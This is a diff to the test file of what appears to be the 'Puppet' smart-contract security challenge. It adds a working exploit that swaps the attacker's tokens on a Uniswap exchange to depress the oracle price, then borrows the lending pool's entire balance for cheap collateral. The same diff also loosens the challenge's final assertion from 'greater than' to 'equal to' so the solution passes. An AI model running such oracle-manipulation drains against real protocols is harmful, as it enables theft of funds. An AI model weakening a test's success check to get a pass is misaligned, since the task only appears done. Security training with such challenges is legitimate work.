@@ -102,6 +102,31 @@ describe('[Challenge] Puppet', function () {
     });
 
     it('Exploit', async function () {
+
+        await this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+
+        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
+             ATTACKER_INITIAL_TOKEN_BALANCE, 
+             1, 
+             Date.now()*2 ,
+           );
+      
+
+
+        const collateral = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log('current collateral',collateral.toString());
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE,{value:collateral});
+        const uniswapTokenBalance = await this.token.balanceOf(this.uniswapExchange.address);
+        console.log("Uniswap token balance",uniswapTokenBalance.toString());
+        const balance = await ethers.provider.getBalance(attacker.address);
+        console.log("My balance ethers",balance.toString(),"my token balance",uniswapTokenBalance.toString())
+        
+
+
+
+
+
+
         /** CODE YOUR EXPLOIT HERE */
     });
 
@@ -114,6 +139,6 @@ describe('[Challenge] Puppet', function () {
         ).to.be.eq('0');
         expect(
             await this.token.balanceOf(attacker.address)
-        ).to.be.gt(POOL_INITIAL_TOKEN_BALANCE);
+        ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE);
     });
 });
